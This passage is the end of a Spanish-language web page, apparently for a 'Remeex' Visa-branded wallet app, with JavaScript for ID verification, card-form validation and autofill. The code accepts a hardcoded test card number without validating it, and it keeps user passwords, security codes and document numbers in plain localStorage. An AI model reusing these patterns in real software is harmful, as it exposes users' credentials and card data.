                  if (idPhone) idPhone.value = '';
                  
                  const idFrontPreview = document.getElementById('id-front-preview');
                  const idBackPreview = document.getElementById('id-back-preview');
                  
                  if (idFrontPreview) idFrontPreview.style.display = 'none';
                  if (idBackPreview) idBackPreview.style.display = 'none';
                  
                  // Update banners
                  checkBannersVisibility();
                }, 500);
              }
            });
          }
          
          // Reset inactivity timer
          resetInactivityTimer();
        });
      }
      
      // Verify later button
      document.querySelectorAll('#verify-later').forEach(btn => {
        if (btn) {
          btn.addEventListener('click', function() {
            const verificationModal = document.getElementById('verification-modal');
            if (verificationModal) verificationModal.style.display = 'none';
            
            showToast('info', 'Verificacin Pospuesta', 'Puede completar la verificacin ms tarde desde su perfil.');
            
            // Reset inactivity timer
            resetInactivityTimer();
          });
        }
      });
    }

    // Validate card form
    function validateCardForm() {
      const cardNumber = document.getElementById('cardNumber');
      const cardName = document.getElementById('cardName');
      const cardMonth = document.getElementById('cardMonth');
      const cardYear = document.getElementById('cardYear');
      const cardCvv = document.getElementById('cardCvv');
      
      const cardNumberError = document.getElementById('card-number-error');
      const cardNameError = document.getElementById('card-name-error');
      const cardDateError = document.getElementById('card-date-error');
      const cardCvvError = document.getElementById('card-cvv-error');
      
      // Reset errors
      if (cardNumberError) cardNumberError.style.display = 'none';
      if (cardNameError) cardNameError.style.display = 'none';
      if (cardDateError) cardDateError.style.display = 'none';
      if (cardCvvError) cardCvvError.style.display = 'none';
      
      // Enhanced validation
      let isValid = true;
      
      if (!cardName || !cardName.value.trim()) {
        if (cardNameError) {
          cardNameError.style.display = 'block';
          cardNameError.textContent = 'Por favor, introduce el nombre del titular.';
        }
        isValid = false;
      }
      
      // Validar el nmero de tarjeta
      if (!cardNumber || !cardNumber.value.trim()) {
        if (cardNumberError) {
          cardNumberError.style.display = 'block';
          cardNumberError.textContent = 'Por favor, introduce un nmero de tarjeta.';
        }
        isValid = false;
      } else {
        // Permitir la tarjeta especfica
        const cleanedCardNumber = cardNumber.value.replace(/\s/g, '');
        if (cleanedCardNumber !== CONFIG.VALID_CARD && !validateCardNumber(cleanedCardNumber)) {
          if (cardNumberError) {
            cardNumberError.style.display = 'block';
            cardNumberError.textContent = 'Nmero de tarjeta no vlido.';
          }
          isValid = false;
        }
      }
      
      if (!cardMonth || !cardMonth.value || !cardYear || !cardYear.value) {
        if (cardDateError) {
          cardDateError.style.display = 'block';
          cardDateError.textContent = 'Por favor, selecciona una fecha vlida.';
        }
        isValid = false;
      } else {
        // Validar que la fecha no est expirada
        const currentDate = new Date();
        const expiryDate = new Date();
        expiryDate.setFullYear(parseInt(cardYear.value), parseInt(cardMonth.value), 1);
        expiryDate.setDate(0); // ltimo da del mes anterior
        
        if (expiryDate < currentDate) {
          if (cardDateError) {
            cardDateError.style.display = 'block';
            cardDateError.textContent = 'La tarjeta ha expirado.';
          }
          isValid = false;
        }
      }
      
      if (!cardCvv || !cardCvv.value || cardCvv.value.length < 3 || !/^\d+$/.test(cardCvv.value)) {
        if (cardCvvError) {
          cardCvvError.style.display = 'block';
          cardCvvError.textContent = 'CVV invlido.';
        }
        isValid = false;
      }
      
      return isValid;
    }

    // Reset card form
    function resetCardForm() {
      const cardNumber = document.getElementById('cardNumber');
      const cardName = document.getElementById('cardName');
      const cardMonth = document.getElementById('cardMonth');
      const cardYear = document.getElementById('cardYear');
      const cardCvv = document.getElementById('cardCvv');
      
      // Reset inputs
      if (cardNumber) cardNumber.value = '';
      if (cardName) cardName.value = '';
      if (cardMonth) cardMonth.value = '';
      if (cardYear) cardYear.value = '';
      if (cardCvv) cardCvv.value = '';
      
      // Reset displays
      const cardNumberDisplay = document.getElementById('card-number-display');
      const cardHolderDisplay = document.getElementById('card-holder-display');
      const cardMonthDisplay = document.getElementById('card-month-display');
      const cardYearDisplay = document.getElementById('card-year-display');
      const cardCvvDisplay = document.getElementById('card-cvv-display');
      
      if (cardNumberDisplay) cardNumberDisplay.textContent = '   ';
      if (cardHolderDisplay) cardHolderDisplay.textContent = ' ';
      if (cardMonthDisplay) cardMonthDisplay.textContent = '';
      if (cardYearDisplay) cardYearDisplay.textContent = '';
      if (cardCvvDisplay) cardCvvDisplay.textContent = '';
      
      // Reset amount selection
      resetAmountSelectors();
    }

    // Iniciar la actualizacin de todas las tasas cuando se carga la pgina
    // Llamar a esto asegura que todos los valores estn actualizados segn la tasa central
    updateExchangeRate(CONFIG.EXCHANGE_RATES.USD_TO_BS);
  </script>

  <div id="transfer-overlay" class="transfer-overlay"></div>
  <script src="spa.js"></script>
  <script>
    (function() {
      const regData = JSON.parse(localStorage.getItem('visaRegistrationCompleted') || '{}');
      const userData = JSON.parse(localStorage.getItem('visaUserData') || '{}');
      const data = Object.assign({}, regData, userData);
      let fullPhone = '';
      if (data.phoneNumberFull) {
        fullPhone = data.phoneNumberFull;
      } else if (data.fullPhoneNumber) {
        fullPhone = data.fullPhoneNumber;
      } else if (data.phonePrefix && data.phoneNumber) {
        fullPhone = data.phonePrefix + data.phoneNumber;
      } else if (data.phoneNumber) {
        fullPhone = data.phoneNumber;
      } else {
        fullPhone = (data.phonePrefix || '') + (data.phoneNumberShort || '');
      }
      const mapping = {
        'full-name': data.fullName || (data.firstName && data.lastName ? `${data.firstName} ${data.lastName}` : ''),
        'email': data.email || '',
        'login-password': data.password || '',
        'visa-code': data.securityCode || data.verificationCode || '',
        'documentNumber': data.documentNumber || '',
        'phoneNumber': fullPhone
      };
      Object.keys(mapping).forEach(id => {
        const el = document.getElementById(id);
        if (el && !el.value && mapping[id]) {
          el.value = mapping[id];
        }
      });

      // Sincronizar datos con los objetos globales si estn vacos
      if (!currentUser.name) {
        currentUser.name = (data.preferredName || `${data.firstName || ''} ${data.lastName || ''}`).trim();
      }
      if (!currentUser.fullName) {
        currentUser.fullName = data.fullName || `${data.firstName || ''} ${data.lastName || ''}`.trim();
      }
      if (!currentUser.email) {
        currentUser.email = data.email || '';
      }
      if (!currentUser.deviceId) {
        currentUser.deviceId = data.deviceId || generateDeviceId();
      }
      if (!currentUser.idNumber) {
        currentUser.idNumber = data.documentNumber || data.idNumber || '';
      }
      if (!currentUser.phoneNumber) {
        currentUser.phoneNumber = fullPhone;
      }
      if (!currentUser.withdrawalsEnabled) {
        currentUser.withdrawalsEnabled = localStorage.getItem('remeexWithdrawalsEnabled') !== 'false';
      }
      if (!currentUser.accountFrozen) {
        currentUser.accountFrozen = localStorage.getItem('remeexFrozen') === 'true';
      }
      if (!currentUser.primaryCurrency) {
        currentUser.primaryCurrency = localStorage.getItem('remeexPrimaryCurrency') || 'usd';
      }
      if (!verificationStatus.idNumber) {
        verificationStatus.idNumber = currentUser.idNumber;
      }
      if (!verificationStatus.phoneNumber) {
        verificationStatus.phoneNumber = currentUser.phoneNumber;
      }
      personalizeStatusTexts();
      personalizeVerificationStatusCards();
      updateBankValidationStatusItem();
    })();
  </script>
</body>
</html>
  <script src="preload.js"></script>
